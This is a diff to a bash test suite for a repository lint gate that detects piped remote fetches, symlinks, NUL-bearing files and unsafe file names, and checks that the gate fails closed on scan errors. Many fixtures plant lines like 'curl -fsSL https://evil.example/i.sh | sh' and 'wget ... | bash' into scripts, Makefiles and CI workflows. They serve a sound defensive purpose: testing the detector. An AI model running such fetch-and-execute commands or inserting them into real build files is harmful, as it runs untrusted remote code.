@@ -11,7 +11,8 @@
 # in the bash-3.2 surface, a `--` after a tool's first operand, a symlink
 # where a recursive scan reads (on disk, always; tracked or an unpinned
 # submodule, repo-wide, in a real checkout), and its own fixtures'
-# git calls surviving a leaked GIT_DIR; PASSES a clean tree, the sanctioned
+# git calls surviving a leaked GIT_DIR, and a report line carrying terminal
+# control bytes (printed escaped, never raw); PASSES a clean tree, the sanctioned
 # `uname -m` in lib/os.sh, and each of those literals where it is legitimate;
 # SKIPS an absent optional dir (the fail-open regression that made the old inline
 # recipe silently pass), FAILS CLOSED on a scan error, and refuses a no-op scan.
@@ -252,7 +253,7 @@ plant_shims "$r" 'if [[ $(uname -s) = (#i)*darwin* ]] {'
 # an ABSENT plugin submodule (uninitialized) is a loud SKIP normally, hard FAIL under STRICT
 r="$work/shim-absent"; mkdir -p "$r/lib"; printf 'noop() { : ; }\n' > "$r/lib/os.sh"
 [ "$(run "$r")" = "0" ] && ok || fail "an absent plugin submodule must pass (loud skip) without STRICT"
-[ "$(run_strict "$r")" != "0" ] && ok || fail "an absent plugin submodule must FAIL under STRICT=1"
+[ "$(run_strict "$r")" = "2" ] && ok || fail "an absent plugin submodule must FAIL CLOSED (exit 2) under STRICT=1: the check could not run"
 
 # --- shared fixture + a message-asserting runner --------------------------------
 seed() {  # $1=root - the minimum tree the shared arms pass, so a case isolates ONE rule
@@ -292,6 +293,32 @@ fails_only_with() {
   pass=$((pass + 1))
 }
 
+# fails_with_rc RC ROOT MESSAGE LABEL [only] - the gate must exit EXACTLY RC
+# with MESSAGE; with `only`, no other check-patterns line but a SKIP. Every
+# scan-error fixture asserts rc 2: a bare "rc != 0" lets a fail-closed site
+# regress to the 1 of a violation (or drop the fatal mark) unseen.
+fails_with_rc() {
+  local want="$1" rc=0 out line
+  shift
+  out="$(STRICT= "$cp" "$1" 2>&1)" || rc=$?
+  [ "$rc" = "$want" ] || fail "$3: expected exit $want, got $rc: $out"
+  case "$out" in
+    *"$2"*) ;;
+    *) fail "$3: expected the message '$2', got: $out" ;;
+  esac
+  if [ "${4:-}" = only ]; then
+    while IFS= read -r line; do
+      case "$line" in
+        "$2"* | "check-patterns: SKIP "*) ;;
+        check-patterns:*) fail "$3: another message fired too: $line" ;;
+      esac
+    done <<<"$out"
+  fi
+  pass=$((pass + 1))
+}
+
+curl_msg="check-patterns: forbidden curl|sh runtime fetch"
+uname_msg="check-patterns: ad-hoc 'uname -m'"
 brew_msg="check-patterns: hardcoded Homebrew prefix"
 fork_msg="check-patterns: a 'brew shellenv' / 'brew --prefix' fork"
 b32_msg="check-patterns: bash 4 syntax in the bash-3.2 surface"
@@ -606,7 +633,7 @@ gnu_tests_err_msg="check-patterns: GNU-regex scan (tests/ pass) errored"
 if [ "$(id -u)" -ne 0 ]; then
   r="$work/gnu-rest-failclosed"; seed "$r"; mkdir -p "$r/lib/locked"
   chmod 000 "$r/lib/locked"
-  fails_with "$r" "$gnu_rest_err_msg" "arm 8's non-tests/ (gnu_rest) pass must fail closed on an unreadable dir"
+  fails_with_rc 2 "$r" "$gnu_rest_err_msg" "arm 8's non-tests/ (gnu_rest) pass must fail closed on an unreadable dir"
   chmod u+rwx "$r/lib/locked"
 else
   echo "  SKIP: running as root - cannot exercise arm 8's gnu_rest fail-closed case"
@@ -615,7 +642,7 @@ fi
 if [ "$(id -u)" -ne 0 ]; then
   r="$work/gnu-tests-failclosed"; seed "$r"; mkdir -p "$r/tests/locked"
   chmod 000 "$r/tests/locked"
-  fails_with "$r" "$gnu_tests_err_msg" "arm 8's tests/ (gnu_tests) pass must fail closed on an unreadable dir"
+  fails_with_rc 2 "$r" "$gnu_tests_err_msg" "arm 8's tests/ (gnu_tests) pass must fail closed on an unreadable dir"
   chmod u+rwx "$r/tests/locked"
 else
   echo "  SKIP: running as root - cannot exercise arm 8's gnu_tests fail-closed case"
@@ -841,16 +868,50 @@ for re_root in 'root.x' 'root+'; do
   fails_only_with "$r" "$em_dash_msg" "a root named '$re_root': a decoy config/nvim/lazy-lockXjson must still fail"
 done
 
-# --- REGRESSION-LOCK: `-I` (binary skip) is not pinned to a specific grep -----
-# version or flavor, so this locks in the CURRENT, relied-upon behavior: a file
-# that carries a NUL byte is treated as binary and skipped by `-I`, even when
-# it also carries the exact forbidden em-dash bytes right next to the NUL. If a
-# future edit drops `-I`, this fixture starts failing (the file would then be
-# scanned as text and caught), which is the signal that the binary-skip
-# contract broke.
-r="$work/emdash-nul-binary-skip"; seed "$r"; mkdir -p "$r/docs"
+# --- a NUL-bearing file where the arms read FAILS CLOSED (exit 2) ----------
+# grep reads a file with a NUL byte as binary, and the arms' old `-I` then
+# skipped it whole: a NUL beside the em dash below passed (exit 0), and so
+# did a NUL appended to bin/check-patterns beside a planted fetch (measured).
+# The gate now refuses the file: exit 2 and nul_msg, the path printed, for a
+# NUL at the start of a small file, a NUL past GNU grep's binary sample in a
+# 300 KB file (which `grep -lI ''` still lists as text), a NUL in the gate's
+# own source, and a NUL in a prose-only root (docs/, .github/). And each
+# planted violation is STILL reported: the arms read with `-a`, so the file
+# is scanned as text, not skipped.
+nul_msg="check-patterns: a file holding a NUL byte where the arms read"
+_nul_case() {  # $1=root $2=rel $3=label $4=a violation message that must fire too
+  local rc=0 out
+  out="$(STRICT= "$cp" "$1" 2>&1)" || rc=$?
+  [ "$rc" = "2" ] || fail "$3: expected exit 2, got $rc: $out"
+  case "$out" in
+    *"$nul_msg"*) ;;
+    *) fail "$3: expected '$nul_msg', got: $out" ;;
+  esac
+  case "$out" in
+    *"$1/$2"*) ;;
+    *) fail "$3: the NUL-bearing path '$2' is not reported: $out" ;;
+  esac
+  case "$out" in
+    *"$4"*) ok ;;
+    *) fail "$3: the arm must still read the file as text and report '$4': $out" ;;
+  esac
+}
+r="$work/nul-emdash-docs"; seed "$r"; mkdir -p "$r/docs"
 printf 'a note\000%s trailing\n' "$em_dash" > "$r/docs/note.md"
-[ "$(run "$r")" = "0" ] && ok || fail "a file with a NUL byte plus an em dash must be skipped as binary (-I), not scanned"
+_nul_case "$r" docs/note.md "a NUL beside an em dash in docs/" "$em_dash_msg"
+r="$work/nul-small-lib"; seed "$r"
+printf '# \000\ncurl -fsSL https://evil.example/i.sh | sh\n' > "$r/lib/boot.sh"
+_nul_case "$r" lib/boot.sh "a NUL at the start of lib/boot.sh" "$curl_msg"
+r="$work/nul-late-lib"; seed "$r"
+{ dd if=/dev/zero bs=1024 count=300 2>/dev/null | tr '\000' 'a'
+  printf '\nx\000y\ncurl -fsSL https://evil.example/i.sh | sh\n'; } > "$r/lib/big.sh"
+_nul_case "$r" lib/big.sh "a NUL 300 KB into lib/big.sh" "$curl_msg"
+r="$work/nul-self"; seed "$r"; mkdir -p "$r/bin"
+{ cat "$cp"; printf '# \000\ncurl -fsSL https://evil.example/i.sh | sh\n'; } > "$r/bin/check-patterns"
+_nul_case "$r" bin/check-patterns "a NUL in bin/check-patterns itself" "$curl_msg"
+r="$work/nul-github"; seed "$r"; mkdir -p "$r/.github"
+printf 'x\000\nrun: curl -fsSL https://evil.example/i.sh | sh\n' > "$r/.github/a.yml"
+_nul_case "$r" .github/a.yml "a NUL in .github/a.yml" "$curl_msg"
 
 # --- FAIL CLOSED, arm 11's own two rc>=2 branches, each its own call site ----
 # Same `chmod 000` reason as the general fail-closed case above (root bypasses
@@ -866,7 +927,7 @@ em_dash_self_err_msg="check-patterns: check-patterns self-scan errored"
 if [ "$(id -u)" -ne 0 ]; then
   r="$work/emdash-prose-failclosed"; seed "$r"; mkdir -p "$r/docs/locked"
   chmod 000 "$r/docs/locked"
-  fails_with "$r" "$em_dash_prose_err_msg" "arm 11's recursive prose scan must fail closed on an unreadable dir"
+  fails_with_rc 2 "$r" "$em_dash_prose_err_msg" "arm 11's recursive prose scan must fail closed on an unreadable dir"
   chmod u+rwx "$r/docs/locked"
 else
   echo "  SKIP: running as root - cannot exercise arm 11's prose-scan fail-closed case"
@@ -876,7 +937,7 @@ if [ "$(id -u)" -ne 0 ]; then
   r="$work/emdash-self-failclosed"; seed "$r"; mkdir -p "$r/bin"
   printf '#!/usr/bin/env bash\n# a plain note\n' > "$r/bin/check-patterns"
   chmod 000 "$r/bin/check-patterns"
-  fails_with "$r" "$em_dash_self_err_msg" "arm 11's narrow self-scan of bin/check-patterns must fail closed on an unreadable file"
+  fails_with_rc 2 "$r" "$em_dash_self_err_msg" "arm 11's narrow self-scan of bin/check-patterns must fail closed on an unreadable file"
   chmod u+rwx "$r/bin/check-patterns"
 else
   echo "  SKIP: running as root - cannot exercise arm 11's self-scan fail-closed case"
@@ -1108,7 +1169,7 @@ GIT_DIR="$steer_sentinel/.git" GIT_WORK_TREE="$steer_sentinel" \
 if [ "$(id -u)" -ne 0 ]; then
   r="$work/sym-find-failclosed"; seed "$r"; mkdir -p "$r/lib/locked"
   chmod 000 "$r/lib/locked"
-  fails_with "$r" "$sym_find_err_msg" "an unreadable dir in the surface must fail closed the symlink scan too"
+  fails_with_rc 2 "$r" "$sym_find_err_msg" "an unreadable dir in the surface must fail closed the symlink scan too"
   chmod u+rwx "$r/lib/locked"
 else
   echo "  SKIP: running as root - cannot exercise arm 12's find-branch fail-closed case"
@@ -1127,15 +1188,19 @@ chmod u+x "$find_shim/find"
 # A FRESH shell: the shim must be the find a new process resolves.
 [ "$(PATH="$find_shim:$PATH" bash -c 'command -v find')" = "$find_shim/find" ] \
   || fail "the find shim is not the find a fresh process resolves"
-# Arm 12's file-name passes run find too, so each reports its own error; no
-# other message may fire.
+# Arm 12's file-name passes and the NUL-byte pass run find too, so each
+# reports its own error; no other message may fire. A scan error exits 2
+# (fail closed), never 1, which reads as "a violation was found".
 r="$work/sym-find-shim"; seed "$r"
-out="$(PATH="$find_shim:$PATH" STRICT= "$cp" "$r" 2>&1)" && fail "a failing find: the gate passed"
-n_name_err=0
+find_rc=0
+out="$(PATH="$find_shim:$PATH" STRICT= "$cp" "$r" 2>&1)" || find_rc=$?
+[ "$find_rc" = "2" ] && ok || fail "a failing find must exit 2 (a scan error), got $find_rc: $out"
+n_name_err=0; n_nul_err=0
 while IFS= read -r line; do
   case "$line" in
     "$sym_find_err_msg"* | "check-patterns: SKIP "*) ;;
     "check-patterns: file-name scan (find) errored"*) n_name_err=$((n_name_err + 1)) ;;
+    "check-patterns: NUL-byte scan (find) errored"*) n_nul_err=$((n_nul_err + 1)) ;;
     check-patterns:*) fail "a failing find: another message fired too: $line" ;;
   esac
 done <<<"$out"
@@ -1145,13 +1210,41 @@ case "$out" in
 esac
 [ "$n_name_err" -eq 2 ] && ok \
   || fail "a find that exits non-zero must fail closed both file-name passes (got $n_name_err): $out"
+[ "$n_nul_err" -eq 1 ] && ok \
+  || fail "a find that exits non-zero must fail closed the NUL-byte pass (got $n_nul_err): $out"
+# ... and EACH find pass alone: a shim that fails only the call holding one
+# argument pair, so no other pass's exit 2 can stand in for this one's.
+find_one="$work/find-one-shim"; mkdir -p "$find_one"
+{
+  printf '#!/bin/sh\n'
+  printf 'prev=""\n'
+  printf 'for a in "$@"; do\n'
+  printf '  if [ "$prev $a" = "$FIND_FAIL_ON" ]; then echo "find: simulated read error" >&2; exit 1; fi\n'
+  printf '  prev="$a"\n'
+  printf 'done\n'
+  printf 'exec "%s" "$@"\n' "$(command -v find)"
+} > "$find_one/find"
+chmod u+x "$find_one/find"
+r="$work/find-one"; seed "$r"
+for fo in '-type l|check-patterns: symlink scan (find) errored' \
+    '-type f|check-patterns: NUL-byte scan (find) errored' \
+    '-name *:*|check-patterns: file-name scan (find) errored' \
+    '-name check-patterns|check-patterns: file-name scan (find) errored'; do
+  fo_rc=0
+  out="$(PATH="$find_one:$PATH" FIND_FAIL_ON="${fo%%|*}" STRICT= "$cp" "$r" 2>&1)" || fo_rc=$?
+  [ "$fo_rc" = "2" ] && ok || fail "a failing find ('${fo%%|*}' pass alone) must exit 2, got $fo_rc: $out"
+  case "$out" in
+    *"${fo#*|}"*) ok ;;
+    *) fail "a failing find ('${fo%%|*}' pass alone): expected '${fo#*|}', got: $out" ;;
+  esac
+done
 
 # --- FAIL CLOSED: a corrupted git index fails the repo-wide git pass, not a
 # silent pass ("no symlinks") -------------------------------------------------
 r="$work/sym-git-failclosed"; _git_repo "$r"; seed "$r"
 git -C "$r" add -A && git -C "$r" commit -qm init
 printf 'garbage, not a git index\n' > "$r/.git/index"
-fails_with "$r" "$sym_git_err_msg" "a corrupted git index must fail closed, not silently pass"
+fails_with_rc 2 "$r" "$sym_git_err_msg" "a corrupted git index must fail closed, not silently pass"
 
 # --- a malformed .git at $root fails CLOSED, never a silent skip of the git
 # pass: a corrupt HEAD makes the toplevel probe error, and a tracked symlink
@@ -1160,7 +1253,7 @@ r="$work/sym-probe-corrupt-head"; _git_repo "$r"; seed "$r"
 ln -s ./target "$r/outside-link"; printf 'x\n' > "$r/target"
 git -C "$r" add -A && git -C "$r" commit -qm init
 printf 'garbage, not a ref\n' > "$r/.git/HEAD"
-fails_with "$r" "$sym_probe_msg" "a .git whose toplevel probe errors must fail closed, not skip the git pass"
+fails_with_rc 2 "$r" "$sym_probe_msg" "a .git whose toplevel probe errors must fail closed, not skip the git pass"
 
 # --- a .git at $root whose core.worktree points elsewhere resolves a
 # different toplevel: fail closed, never scan the other tree -----------------
@@ -1169,7 +1262,7 @@ ln -s ./target "$r/outside-link"; printf 'x\n' > "$r/target"
 git -C "$r" add -A && git -C "$r" commit -qm init
 mkdir -p "$work/sym-probe-worktree-elsewhere"
 git -C "$r" config core.worktree "$work/sym-probe-worktree-elsewhere"
-fails_only_with "$r" "$sym_top_msg" "a .git whose core.worktree points away from \$root must fail closed"
+fails_with_rc 2 "$r" "$sym_top_msg" "a .git whose core.worktree points away from \$root must fail closed" only
 
 # --- a .git at $root with git absent from PATH fails CLOSED -----------------
 # PATH is an explicit allowlist: every external tool bin/check-patterns runs
@@ -1178,7 +1271,7 @@ fails_only_with "$r" "$sym_top_msg" "a .git whose core.worktree points away from
 # the git pass would run (mktemp, rm) sits here too. A tool check-patterns
 # needs that is missing here makes it print "command not found", failed below.
 nogit_bin="$work/nogit-bin"; mkdir -p "$nogit_bin"
-for t in bash env grep sed find mktemp cat sort rm; do
+for t in bash env grep sed find mktemp cat sort rm tr; do
   # type -P: a PATH file only, never a builtin, function or alias of that name.
   t_path="$(type -P "$t" || true)"
   [ -n "$t_path" ] || fail "the git-less PATH fixture needs '$t', which is not on PATH"
@@ -1200,7 +1293,7 @@ nogit_out="$(PATH="$nogit_bin" STRICT= "$cp" "$r" 2>&1)" || true
 case "$nogit_out" in
   *"command not found"*) fail "the git-less PATH fixture lacks a tool bin/check-patterns runs: $nogit_out" ;;
 esac
-PATH="$nogit_bin" fails_only_with "$r" "$sym_nogit_msg" "a .git at root with git absent from PATH must fail closed"
+PATH="$nogit_bin" fails_with_rc 2 "$r" "$sym_nogit_msg" "a .git at root with git absent from PATH must fail closed" only
 
 # --- GIT_TRACE / GIT_TRACE2 on stderr (not local env vars, so not stripped)
 # must not corrupt the first NUL record: a first-sorting tracked symlink
@@ -1211,7 +1304,7 @@ git -C "$r" add -A && git -C "$r" commit -qm init
 for tv in GIT_TRACE GIT_TRACE2; do
   trace_rc=0
   trace_out="$(env "$tv=1" STRICT= "$cp" "$r" 2>&1)" || trace_rc=$?
-  [ "$trace_rc" != "0" ] || fail "$tv=1 must not hide a first-sorting tracked symlink (rc 0)"
+  [ "$trace_rc" = "2" ] || fail "$tv=1 must fail closed (exit 2), got $trace_rc: $trace_out"
   case "$trace_out" in
     *"$sym_git_stderr_msg"*) ok ;;
     *) fail "$tv=1: expected '$sym_git_stderr_msg', got: $trace_out" ;;
@@ -1222,7 +1315,7 @@ done
 for tv in GIT_TRACE GIT_TRACE2; do
   trace_rc=0
   trace_out="$(env "$tv=/dev/stdout" STRICT= "$cp" "$r" 2>&1)" || trace_rc=$?
-  [ "$trace_rc" != "0" ] || fail "$tv=/dev/stdout must not hide a first-sorting tracked symlink (rc 0)"
+  [ "$trace_rc" = "2" ] || fail "$tv=/dev/stdout must fail closed (exit 2), got $trace_rc: $trace_out"
   case "$trace_out" in
     *"- failing closed"*) ok ;;
     *) fail "$tv=/dev/stdout: expected a fail-closed message, got: $trace_out" ;;
@@ -1246,7 +1339,7 @@ for how in prepend append; do
   chmod u+x "$shim/git"
   rec_rc=0
   rec_out="$(PATH="$shim:$PATH" STRICT= "$cp" "$r" 2>&1)" || rec_rc=$?
-  [ "$rec_rc" != "0" ] || fail "a malformed ($how) listing record must fail closed (rc 0)"
+  [ "$rec_rc" = "2" ] || fail "a malformed ($how) listing record must fail closed (exit 2), got $rec_rc: $rec_out"
   case "$rec_out" in
     *"$sym_git_record_msg"*) ok ;;
     *) fail "a malformed ($how) listing record: expected '$sym_git_record_msg', got: $rec_out" ;;
@@ -1317,7 +1410,7 @@ if [ "$(id -u)" -ne 0 ]; then
     r="$work/zsh-mode-$zmode"; seed "$r"; mkdir -p "$r/zsh"
     printf 'uname -m\n' > "$r/zsh/arch.zsh"
     chmod "$zmode" "$r/zsh"
-    fails_with "$r" "check-patterns: curl|sh scan errored" "a zsh/ at mode $zmode must fail closed"
+    fails_with_rc 2 "$r" "check-patterns: curl|sh scan errored" "a zsh/ at mode $zmode must fail closed"
     chmod u+rwx "$r/zsh"
   done
 else
@@ -1414,8 +1507,6 @@ esac
 # through $P, $D and a doubled backslash, so THIS file never carries a shape
 # arms 8-10 read (they scan tests/).
 P='|'; D='--'
-curl_msg="check-patterns: forbidden curl|sh runtime fetch"
-uname_msg="check-patterns: ad-hoc 'uname -m'"
 # _plug_case ARM -> "MESSAGE|SHAPE" for one recursive arm.
 _plug_case() {
   case "$1" in
@@ -1559,7 +1650,7 @@ fails_only_with "$r" "$plugins_msg" "a symlink directly under zsh/plugins/ (no .
 if [ "$(id -u)" -ne 0 ]; then
   r="$work/plug-nogit-locked"; seed "$r"; mkdir -p "$r/zsh/plugins"
   chmod 000 "$r/zsh/plugins"
-  fails_only_with "$r" "check-patterns: zsh/plugins scan (find) errored" "an unreadable zsh/plugins (no .git) must fail closed"
+  fails_with_rc 2 "$r" "check-patterns: zsh/plugins scan (find) errored" "an unreadable zsh/plugins (no .git) must fail closed" only
   chmod u+rwx "$r/zsh/plugins"
 else
   echo "  SKIP: running as root - cannot exercise the zsh/plugins find fail-closed case"
@@ -1595,7 +1686,7 @@ for how in fail empty nodir noindex; do
     nodir) [ "$lev_probe" = "GIT_WORK_TREE"$'\n'"GIT_INDEX_FILE" ] ;;
     noindex) [ "$lev_probe" = "GIT_DIR"$'\n'"GIT_WORK_TREE" ] ;;
   esac || fail "the '$how' git shim is not what a fresh process sees (rc $lev_probe_rc): $lev_probe"
-  PATH="$shim:$PATH" fails_only_with "$r" "$lev_msg" "a '$how' --local-env-vars answer must fail closed"
+  PATH="$shim:$PATH" fails_with_rc 2 "$r" "$lev_msg" "a '$how' --local-env-vars answer must fail closed" only
 done
 
 # === arm (12): git inside $root never runs core.fsmonitor ====================
@@ -1622,7 +1713,7 @@ rm -f "$fsm_hit"
 r="$work/dubious"; _git_repo "$r"; seed "$r"
 git -C "$r" add -A && git -C "$r" commit -qm init
 GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1 GIT_TEST_ASSUME_DIFFERENT_OWNER=1 \
-  fails_only_with "$r" "$sym_probe_msg" "a repo git refuses as dubiously owned must fail closed"
+  fails_with_rc 2 "$r" "$sym_probe_msg" "a repo git refuses as dubiously owned must fail closed" only
 
 # === arm (11): `-H` names the file even for a SINGLE operand ================
 # grep drops the PATH prefix when it gets one operand. A tree whose only
@@ -1643,32 +1734,15 @@ esac
 # === edge fixtures across the arms: no final newline, CRLF, `:` and space ===
 # Each arm must still fire, alone, and report the hit at ROOT/REL:1:, for a
 # file ending without a newline, CRLF line endings (a stray \r before the
-# line end) and a space in the name: shapes a line-oriented gate can drop. A
+# line end), a space in the name and a name starting with `-` (an option to
+# any tool that ever gets it as a bare operand): shapes a line-oriented gate
+# can drop. A
 # `:` in the name breaks the PATH:NN: split every arm relies on, so there the
 # gate must fail CLOSED (exit 2) whatever each arm reports. The names differ
 # by more than case: macOS's filesystem folds case.
-# _fails_closed ROOT MESSAGE LABEL [only] - exit 2 exactly, with MESSAGE; with
-# `only`, no other check-patterns line but a SKIP.
+# Fail-closed cases use fails_with_rc 2 (defined with the shared runners).
 names_msg="check-patterns: a file name holding ':', a newline or a CR"
 stray_msg="check-patterns: a file named check-patterns outside bin/"
-_fails_closed() {
-  local rc=0 out line
-  out="$(STRICT= "$cp" "$1" 2>&1)" || rc=$?
-  [ "$rc" = "2" ] || fail "$3: expected exit 2 (fail closed), got $rc: $out"
-  case "$out" in
-    *"$2"*) ;;
-    *) fail "$3: expected the message '$2', got: $out" ;;
-  esac
-  if [ "${4:-}" = only ]; then
-    while IFS= read -r line; do
-      case "$line" in
-        "$2"* | "check-patterns: SKIP "*) ;;
-        check-patterns:*) fail "$3: another message fired too: $line" ;;
-      esac
-    done <<<"$out"
-  fi
-  pass=$((pass + 1))
-}
 # _edge_case ROOT REL MESSAGE LABEL - fails_only_with, plus the hit line.
 _edge_case() {
   local rc=0 out line hit=0
@@ -1697,18 +1771,19 @@ for edge in 1:lib 2:lib 5:lib 6:lib 7:lib 8:tests 9:tests 10:tests 11:docs; do
   else
     pc="$(_plug_case "$arm")"
   fi
-  for variant in noeol crlf colon space; do
+  for variant in noeol crlf colon space dash; do
     case "$variant" in
       noeol) name="edge-noeol.sh"; fmt='%s' ;;
       crlf) name="edge-crlf.sh"; fmt='%s\r\n' ;;
       colon) name="edge:colon.sh"; fmt='%s\n' ;;
       space) name="edge space.sh"; fmt='%s\n' ;;
+      dash) name="-edge-dash.sh"; fmt='%s\n' ;;
     esac
     r="$work/edge-$arm-$variant"; seed "$r"; mkdir -p "$r/$dir"
     # shellcheck disable=SC2059  # the format is one of the fixed ones above
     printf "$fmt" "${pc#*|}" > "$r/$dir/$name"
     if [ "$variant" = colon ]; then
-      _fails_closed "$r" "$names_msg" "arm $arm, $variant ($dir/$name)"
+      fails_with_rc 2 "$r" "$names_msg" "arm $arm, $variant ($dir/$name)"
     else
       _edge_case "$r" "$dir/$name" "${pc%%|*}" "arm $arm, $variant ($dir/$name)"
     fi
@@ -1738,17 +1813,17 @@ want="edge-b.sh:1"$'\n'"edge.sh:9"$'\n'"edge.sh:10"
 nl=$'\n'; cr=$'\r'
 r="$work/name-colon-dir"; seed "$r"; mkdir -p "$r/docs/a:b"
 printf 'x\n' > "$r/docs/a:b/x.md"
-_fails_closed "$r" "$names_msg" "a directory name holding ':'" only
+fails_with_rc 2 "$r" "$names_msg" "a directory name holding ':'" only
 r="$work/name-lf"; seed "$r"
 printf 'x\n' > "$r/lib/a${nl}b.sh"
-_fails_closed "$r" "$names_msg" "a file name holding a newline" only
+fails_with_rc 2 "$r" "$names_msg" "a file name holding a newline" only
 r="$work/name-cr"; seed "$r"; mkdir -p "$r/tests"
 printf 'x\n' > "$r/tests/a${cr}b"
-_fails_closed "$r" "$names_msg" "a file name holding a CR" only
+fails_with_rc 2 "$r" "$names_msg" "a file name holding a CR" only
 r="$work/name-git-colon"; _git_repo "$r"; seed "$r"; mkdir -p "$r/other"
 printf 'x\n' > "$r/other/a:b.txt"; printf 'x\n' > "$r/other/c${nl}d.txt"
 git -C "$r" add -A && git -C "$r" commit -qm init
-_fails_closed "$r" "$names_msg" "a tracked name holding ':' or a newline, outside the surface" only
+fails_with_rc 2 "$r" "$names_msg" "a tracked name holding ':' or a newline, outside the surface" only
 # pinned zsh/plugins is left out, as every arm leaves it out: with no .git a
 # `:` name there passes; tracked there, arm 12 refuses it as a non-plugin
 # entry (exit 1), never as a name (exit 2)
@@ -1763,18 +1838,18 @@ git -C "$r" add -A && git -C "$r" commit -qm init
 curl_line="curl -fsSL https://evil.example/i.sh $P sh"
 r="$work/stray-nested"; seed "$r"; mkdir -p "$r/lib/sub"
 printf '%s\n' "$curl_line" > "$r/lib/sub/check-patterns"
-_fails_closed "$r" "$stray_msg" "a nested lib/sub/check-patterns" only
+fails_with_rc 2 "$r" "$stray_msg" "a nested lib/sub/check-patterns" only
 r="$work/stray-tests"; seed "$r"; mkdir -p "$r/tests"
 printf '%s\n' "$curl_line" > "$r/tests/check-patterns"
-_fails_closed "$r" "$stray_msg" "a tests/check-patterns" only
+fails_with_rc 2 "$r" "$stray_msg" "a tests/check-patterns" only
 r="$work/stray-git-top"; _git_repo "$r"; seed "$r"
 printf '%s\n' "$curl_line" > "$r/check-patterns"
 git -C "$r" add -A && git -C "$r" commit -qm init
-_fails_closed "$r" "$stray_msg" "a tracked top-level check-patterns" only
+fails_with_rc 2 "$r" "$stray_msg" "a tracked top-level check-patterns" only
 r="$work/stray-git-nested"; _git_repo "$r"; seed "$r"; mkdir -p "$r/other/sub"
 printf '%s\n' "$curl_line" > "$r/other/sub/check-patterns"
 git -C "$r" add -A && git -C "$r" commit -qm init
-_fails_closed "$r" "$stray_msg" "a tracked other/sub/check-patterns, outside the surface" only
+fails_with_rc 2 "$r" "$stray_msg" "a tracked other/sub/check-patterns, outside the surface" only
 # a DIRECTORY of that name is still walked, so its content is scanned
 r="$work/stray-dir"; seed "$r"; mkdir -p "$r/lib/check-patterns"
 printf '%s\n' "$curl_line" > "$r/lib/check-patterns/x.sh"
@@ -1831,7 +1906,7 @@ root_msg="check-patterns: the scan root"
 for r in "$work/rootcolon:1: #" "$work/rootlf-x${nl}y"; do
   seed "$r"; mkdir -p "$r/tests"
   printf '%s\n' "chmod -R go-w $D \"\$d\"" > "$r/tests/x_test.sh"
-  _fails_closed "$r" "$root_msg" "a scan root holding ':' or a newline: $r" only
+  fails_with_rc 2 "$r" "$root_msg" "a scan root holding ':' or a newline: $r" only
 done
 # The newline root's first line half repeats once per descendant in the
 # case-collision guard's line-oriented listing below: remove it now.
@@ -1850,6 +1925,602 @@ printf '#!/bin/sh\n: gate\n' > "$r/bin/check-patterns"
 git -C "$r" add -A && git -C "$r" commit -qm init
 [ "$(run "$r")" = "0" ] && ok || fail "a tracked bin/check-patterns must pass"
 
+# === arm 1 reads the Makefile and .github/, never tests/ docs/ .claude/ =====
+# The Makefile's recipes, a workflow's `run:` steps and a composite action's
+# steps execute on every CI leg, so a fetch piped into a shell there runs as
+# surely as one in lib/. tests/ plants real fetch shapes as fixtures, and
+# docs/ and .claude/ are prose that names them, so those three stay OUT of
+# arm 1's surface.
+r="$work/arm1-makefile"; seed "$r"
+printf 'boot:\n\tcurl -fsSL https://evil.example/i.sh | sh\n' > "$r/Makefile"
+fails_only_with "$r" "$curl_msg" "a curl|sh in a Makefile recipe must be caught by arm 1"
+r="$work/arm1-workflow"; seed "$r"; mkdir -p "$r/.github/workflows"
+printf 'jobs:\n  a:\n    steps:\n      - run: wget -qO- https://evil.example/i.sh | bash\n' \
+  > "$r/.github/workflows/ci.yml"
+fails_only_with "$r" "$curl_msg" "a wget|bash in a workflow run: step must be caught by arm 1"
+r="$work/arm1-action"; seed "$r"; mkdir -p "$r/.github/actions/a"
+printf 'runs:\n  using: composite\n  steps:\n    - run: curl -fsSL https://evil.example/i.sh | sh\n' \
+  > "$r/.github/actions/a/action.yml"
+fails_only_with "$r" "$curl_msg" "a curl|sh in a composite action (.github/, outside workflows/) must be caught by arm 1"
+for d in tests docs .claude; do
+  r="$work/arm1-out-$d"; seed "$r"; mkdir -p "$r/$d"
+  printf 'curl -fsSL https://evil.example/i.sh | sh\n' > "$r/$d/fixture.sh"
+  [ "$(run "$r")" = "0" ] && ok || fail "arm 1 must not scan $d/ (a planted fixture there must pass)"
+done
+# the optional roots ABSENT (no Makefile, no .github/): skipped, not a scan
+# error - a hit in lib/ is reported alone, exit 1
+r="$work/arm1-absent-roots"; seed "$r"
+printf 'curl -fsSL https://evil.example/i.sh | sh\n' > "$r/lib/boot.sh"
+{ [ ! -e "$r/Makefile" ] && [ ! -e "$r/.github" ]; } || fail "arm1-absent-roots: the fixture must lack Makefile and .github/"
+fails_only_with "$r" "$curl_msg" "arm 1 with no Makefile and no .github/ must still report a hit in lib/"
+[ "$(run "$r")" = "1" ] && ok || fail "arm 1 with absent optional roots must exit 1 (a violation), not 2 (a scan error)"
+# `-H` names the file even for a SINGLE operand: a tree whose only arm 1
+# root is install.sh must still report PATH:NN:
+r="$work/arm1-one-operand"; mkdir -p "$r"
+printf 'curl -fsSL https://evil.example/i.sh | sh\n' > "$r/install.sh"
+out="$(STRICT= "$cp" "$r" 2>&1)" && fail "a lone arm 1 operand: the gate passed"
+case "$out" in
+  "$r/install.sh:1:curl -fsSL"* | *$'\n'"$r/install.sh:1:curl -fsSL"*) ok ;;
+  *) fail "a lone arm 1 operand must be reported as PATH:NN: (grep -H), got: $out" ;;
+esac
+
+# === arms 1 and 2 self-scan bin/check-patterns, with no exemption ===========
+# Every recursive arm excludes the base name check-patterns, so before this
+# pass a real fetch or `uname -m` added to the gate itself ran unscanned
+# (measured: exit 0). The gate's own source is written so that neither arm
+# matches it - its patterns are assembled from pieces and its prose avoids
+# the literal shapes - so the self-scan needs no exemption at all: a copy of
+# the real gate passes, and the same copy with one violating line appended
+# (code or comment, arm 1 reads comments too) fails with that arm's message.
+r="$work/self-clean"; seed "$r"; mkdir -p "$r/bin"
+cat "$cp" > "$r/bin/check-patterns"
+[ "$(run "$r")" = "0" ] && ok || fail "a verbatim copy of bin/check-patterns must pass its own self-scans"
+_self_mutant() {  # $1=label $2=line to append $3=expected message
+  local r="$work/self-mutant-$1"
+  seed "$r"; mkdir -p "$r/bin"
+  { cat "$cp"; printf '%s\n' "$2"; } > "$r/bin/check-patterns"
